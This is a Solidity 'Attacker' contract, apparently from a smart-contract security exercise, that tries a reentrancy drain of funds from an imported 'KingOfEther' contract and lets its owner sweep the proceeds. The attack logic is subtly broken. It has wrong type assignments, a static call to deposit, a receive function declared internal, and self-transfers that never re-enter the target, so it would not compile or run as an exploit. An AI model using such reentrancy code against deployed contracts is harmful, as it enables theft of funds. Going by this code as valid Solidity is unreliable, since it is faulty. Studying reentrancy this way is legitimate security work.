// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {KingOfEther} from  "../src/KingOfEther.sol";

contract Attacker{
    KingOfEther _kingOf;
    address public owner;
    address public amount;

    constructor(address _kingOfEther){
        _kingOf = _kingOfEther;
        owner = msg.sender;
    }

    function attack() public payable{
        require(msg.value > 0,"sendSomething");
        KingOfEther.deposit(msg.value);
        if(_kingOf.balance()>0){
            _kingOf.withdraw();
            payable(address(this)).call{value:msg.value}("");
        }
    }

    function receive() internal payable {
        if (_kingOf.balance()>0){
            _kingOf.withdraw();
            payable(address(this)).call{value:msg.value}("");
        }
    }

    function withdraw() public {
        require(msg.sender == owner,"notOwner");
        payable(owner).transfer(address(this).balance);
    }
}